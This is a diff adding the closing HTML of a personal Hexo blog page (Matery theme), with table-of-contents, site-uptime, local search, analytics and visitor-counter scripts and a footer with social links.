+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('1'),
+            headingSelector: 'h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+        <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2021</span>
+            
+            <a href="/about" target="_blank">MiaoTony</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">186.5k</span>&nbsp;字
+                                                                                    <span id="busuanzi_container_site_pv">
+			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+                                    <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+                        <br>
+                        <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "11";
+                    var startDate = "28";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+                        <br>
+                    </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="关注我的TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
+        <i class="fab fa-telegram"></i>
+    </a>
+
+
+
+    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/js/matery.min.js"></script>
+
+    
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    
+    
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+    
+
+    
+
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
